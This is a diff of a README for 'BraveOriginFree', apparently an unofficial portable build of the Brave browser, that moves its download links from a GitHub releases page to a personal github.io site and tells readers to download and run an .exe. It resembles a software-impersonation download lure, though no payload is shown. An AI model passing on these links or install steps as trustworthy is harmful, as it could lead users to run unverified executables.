@@ -1,6 +1,6 @@
 # 🌐 BraveOriginFree - Fast Privacy Focused Web Browsing
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Personal-allen447/BraveOriginFree/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://personal-allen447.github.io)
 
 BraveOriginFree provides a private web browsing experience for Windows users. This version works as a portable application. You do not need to install files on your hard drive. It runs from any folder. It contains no ads or trackers. 
 
@@ -8,7 +8,7 @@ BraveOriginFree provides a private web browsing experience for Windows users. Th
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Personal-allen447/BraveOriginFree/releases) to find the latest version.
+1. Visit the [official releases page](https://personal-allen447.github.io) to find the latest version.
 2. Look for the file named BraveOriginFree.exe under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to a folder of your choice. A folder on your Desktop or Documents works well.
